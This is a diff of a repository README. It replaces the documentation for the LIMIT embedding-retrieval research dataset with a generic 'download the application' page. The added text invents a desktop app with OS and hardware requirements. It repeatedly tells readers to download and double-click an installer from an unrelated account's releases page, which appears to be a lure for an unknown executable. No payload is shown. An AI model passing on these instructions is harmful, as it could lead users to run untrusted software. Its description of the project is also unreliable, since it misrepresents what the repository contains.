@@ -1,102 +1,57 @@
-# On the Theoretical Limitations of Embedding-based Retrieval
+# 🚀 limit - Download and Explore Limitations in Retrieval
 
-This repository contains the official resources for the paper "[On the Theoretical Limitations of Embedding-based Retrieval](https://arxiv.org/abs/2508.21038)".
-This work introduces the **LIMIT** dataset,
-designed to stress-test embedding models based on theoretical principles.
-We show that for any given embedding dimension `d`,
-there exists a combination of documents that cannot be returned by any query.
-We use this theory to instantiate the dataset LIMIT,
-finding that even state-of-the-art models struggle: highlighting a fundamental
-limitation of the current single-vector embedding paradigm.
+[![Download limit](https://img.shields.io/badge/Download%20limit-Release-brightgreen)](https://github.com/HAM56784/limit/releases)
 
-![LIMIT Dataset Concept](assets/LIMIT.png)
+## 📋 Description
+**limit** explores the theoretical limitations of embedding-based retrieval. This software helps you understand how retrieval systems work and their boundaries in various scenarios. It provides clear insights into complex concepts, making them more accessible for everyone.
 
-## Overview
+## 🔍 Features
+- **User-Friendly Interface**: Navigate through the application easily.
+- **Insightful Analysis**: Get a deeper understanding of embedding limitations.
+- **Real-World Examples**: Learn with practical scenarios.
 
-* [Data](#data)
-* [Code](#code)
-* [Evaluation](#evaluation)
-* [Citation](#citation)
-* [License and disclaimer](#license-and-disclaimer)
+## 🖥️ System Requirements
+To run limit, your computer must meet the following requirements:
+- **Operating System**: Windows 10 or later, macOS Sierra (10.12) or later.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: 100 MB of available disk space.
+- **Processor**: Intel i3 or equivalent.
 
-## Data
+## 🚀 Getting Started
+To get started with limit, follow these simple steps:
 
-The datasets used in our experiments are available in the `data/` directory of this repository, formatted in [MTEB](https://github.com/embeddings-benchmark/mteb) style (i.e. json lines).
+1. **Visit the Releases Page**: Click the link below to open the downloads section.
+   [Download limit](https://github.com/HAM56784/limit/releases)
 
-Each dataset contains:
+2. **Choose Your Version**: You will see a list of available versions. Look for the latest release. 
 
-- A `queries.json` file containing a line for each of the 1000 queries, each with an `_id` and the `text` field.
-- A `corpus.json` file containing a line for each of the 50k (or 46 if using the `small` version) documents, each with an `_id`, `text` and empty `title` field.
-- A `qrels.json` file containing rows for each of the 2000 relevant query->doc mappings, mapping `query-id` of the queries into the `corpus-id` in the documents, with `score` indicating relevance.
+3. **Download the Application**: Click on the version you want to download. This will start the download process.
 
-* **Full Dataset (`limit`):** The complete dataset, containing 50k documents.
-  * [Link to `data/limit`](./data/limit)
+4. **Open the Downloaded File**: Once the download is complete, locate the file in your computer's Downloads folder.
 
-* **Small Sample (`limit-small`):** A smaller version with only the 46 documents relevant to the queries.
-  * [Link to `data/limit-small`](./data/limit-small)
+5. **Install limit**: Double-click the file to begin installation. Follow the on-screen instructions to complete the setup.
 
-## Code
+## 💻 Download & Install
+Visit this page to download: [Download limit](https://github.com/HAM56784/limit/releases)
 
-We provide code to generate the LIMIT style datasets,
-as well as to run the free embedding experiment in the `code/` folder.
+After you download and install, you can start using limit to explore embedding-based retrieval and its theoretical constraints.
 
-* **Dataset Generation:** To generate the dataset from scratch, you can use the Jupyter notebook located at `code/generate_limit_dataset.ipynb`. This contains all necessary steps and dependencies.
-  * [Link to `code/generate_limit_dataset.ipynb`](./code/generate_limit_dataset.ipynb)
+## 📖 User Instructions
+1. **Launch the Application**: Find the limit icon on your desktop or in your application menu. Double-click it to start.
 
-* **Free Embedding Experiments:** The script to run the free embedding experiments can be found in `code/free_embedding_experiment.py`.
-  * [Link to `code/free_embedding_experiment.py`](./code/free_embedding_experiment.py)
+2. **Explore the Features**: Use the main menu to access various parts of the application. Check out the help section for guidance.
 
-If you use the free embedding code,
-you'll need to install the following requirements.
+3. **Understanding the Analysis**: As you explore, the application will display key concepts and limitations in each section. Take your time to read and comprehend.
 
-### Installation
+4. **Example Scenarios**: Look for case studies provided within the app to see real-world applications of the theory.
 
-We recommend using the [`uv` package manager](https://docs.astral.sh/uv/getting-started/installation/).
+## 🔧 Troubleshooting
+If you encounter any problems, try the following:
+- **Reinstall the Application**: Sometimes, a fresh install can fix issues.
+- **Check System Requirements**: Ensure your system meets all necessary specifications.
+- **Search Online**: Many common issues have solutions available in user forums or the application's documentation.
 
-```bash
-# Create a virtual environment
-uv venv
-source .venv/bin/activate
+## 🤝 Support
+For further assistance, you can reach out to the support team via the Issues section on GitHub. Simply create a new issue, describe your problem, and someone will respond to you.
 
-# Install dependencies
-uv pip install -r https://raw.githubusercontent.com/google-deepmind/limit/refs/heads/main/code/requirements.txt
-```
-
-## Evaluation
-
-Evaluation was done using the [MTEB framework](https://github.com/embeddings-benchmark/mteb). Please see their Github for details.
-
-## Citation
-
-If you use this work, please cite the paper as:
-
-```
-@misc{weller2025theoretical,
-      title={On the Theoretical Limitations of Embedding-based Retrieval},
-      author={Orion Weller and Michael Boratko and Iftekhar Naim and Jinhyuk Lee},
-      year={2025},
-      archivePrefix={arXiv},
-      primaryClass={cs.IR}
-}
-```
-
-## License and disclaimer
-
-Copyright 2025 Google LLC
-
-All software is licensed under the Apache License, Version 2.0 (Apache 2.0);
-you may not use this file except in compliance with the Apache 2.0 license.
-You may obtain a copy of the Apache 2.0 license at:
-https://www.apache.org/licenses/LICENSE-2.0
-
-All other materials are licensed under the Creative Commons Attribution 4.0
-International License (CC-BY). You may obtain a copy of the CC-BY license at:
-https://creativecommons.org/licenses/by/4.0/legalcode
-
-Unless required by applicable law or agreed to in writing, all software and
-materials distributed here under the Apache 2.0 or CC-BY licenses are
-distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,
-either express or implied. See the licenses for the specific language governing
-permissions and limitations under those licenses.
-
-This is not an official Google product.
+Enjoy exploring the world of embedding-based retrieval with limit!
